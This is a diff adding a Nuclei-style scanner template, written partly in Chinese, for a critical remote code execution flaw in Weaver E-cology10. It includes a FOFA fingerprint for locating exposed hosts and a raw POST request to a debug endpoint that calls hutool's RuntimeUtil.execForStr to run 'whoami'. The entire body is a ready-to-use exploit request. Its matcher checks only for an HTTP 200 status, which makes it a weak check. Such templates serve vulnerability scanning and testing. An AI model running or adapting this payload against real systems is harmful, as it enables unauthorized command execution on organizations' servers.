@@ -1,0 +1,34 @@
+id: poc-me2gd18bhx4g7pcx
+info:
+  name: 泛微E-cology10 method存在远程代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/me2gd18bhx4g7pcx'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: me2gd18bhx4g7pcx
+    fofa: icon_hash="-1619753057"
+http:
+- raw:
+  - 'POST /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: keep-alive
+
+    Content-Type: application/json
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+
+    [["whoami"]]'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
